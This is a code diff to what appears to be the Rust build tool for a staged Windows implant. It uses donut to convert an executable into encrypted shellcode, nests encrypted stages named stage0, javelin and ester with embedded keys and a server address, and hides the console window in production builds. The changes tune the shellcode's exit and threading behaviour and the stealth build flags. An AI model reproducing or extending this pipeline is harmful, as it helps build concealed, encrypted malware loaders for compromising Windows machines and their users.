@@ -56,15 +56,18 @@ fn convert_exe_to_shellcode(exe_path: &Path, output_path: &Path) -> Result<Vec<u
     // Run donut to convert EXE to shellcode
     // -a 2 = amd64 only (our target)
     // -f 1 = binary format
-    // -x 1 = exit thread (don't kill parent process)
+    // -x 2 = exit process when done (safer for nested shellcode)
+    // -e 3 = entropy + encryption
+    // -t = Create new thread for loader (important for stability)
     let output = Command::new(donut_exe)
         .args(&[
             "-i", &exe_path.to_string_lossy(),
             "-o", &output_path.to_string_lossy(),
             "-a", "2",   // x64 only
             "-f", "1",   // binary format
-            "-x", "1",   // exit thread after execution
+            "-x", "2",   // exit process when done
             "-e", "3",   // entropy + encryption
+            "-t",        // create new thread for loader
         ])
         .output()?;
 
@@ -128,17 +131,23 @@ fn build_stage0(config: &StageConfig) -> Result<Vec<u8>, Box<dyn std::error::Err
     update_stage0_config(&config.server_address)?;
 
     // Determine features
+    // In production: --no-default-features to disable 'dev' console window
     let features = if config.production { "production" } else { "dev" };
 
     // Build Stage0
+    let mut args = vec![
+        "build",
+        "--release",
+        "--target", "x86_64-pc-windows-msvc",
+        "--package", "stage0",
+    ];
+    if config.production {
+        args.push("--no-default-features");
+    }
+    args.extend(&["--features", features]);
+
     let status = Command::new("cargo")
-        .args(&[
-            "build",
-            "--release",
-            "--target", "x86_64-pc-windows-msvc",
-            "--package", "stage0",
-            "--features", features,
-        ])
+        .args(&args)
         .status()?;
 
     if !status.success() {
@@ -217,17 +226,23 @@ fn build_javelin_with_stage0(
     update_javelin_loader(&encrypted_stage0, key)?;
 
     // Determine features
+    // In production: --no-default-features to disable 'dev' console window
     let features = if config.production { "production" } else { "dev" };
 
     // Build JAVELIN
+    let mut args = vec![
+        "build",
+        "--release",
+        "--target", "x86_64-pc-windows-msvc",
+        "--package", "javelin",
+    ];
+    if config.production {
+        args.push("--no-default-features");
+    }
+    args.extend(&["--features", features]);
+
     let status = Command::new("cargo")
-        .args(&[
-            "build",
-            "--release",
-            "--target", "x86_64-pc-windows-msvc",
-            "--package", "javelin",
-            "--features", features,
-        ])
+        .args(&args)
         .status()?;
 
     if !status.success() {
@@ -343,17 +358,23 @@ fn build_ester_with_javelin(
     update_ester_config(&encrypted_javelin, key)?;
 
     // Determine features
+    // In production: --no-default-features to disable 'dev' console window
     let features = if config.production { "production" } else { "dev" };
 
     // Build ESTER
+    let mut args = vec![
+        "build",
+        "--release",
+        "--target", "x86_64-pc-windows-msvc",
+        "--package", "ester",
+    ];
+    if config.production {
+        args.push("--no-default-features");
+    }
+    args.extend(&["--features", features]);
+
     let status = Command::new("cargo")
-        .args(&[
-            "build",
-            "--release",
-            "--target", "x86_64-pc-windows-msvc",
-            "--package", "ester",
-            "--features", features,
-        ])
+        .args(&args)
         .status()?;
 
     if !status.success() {
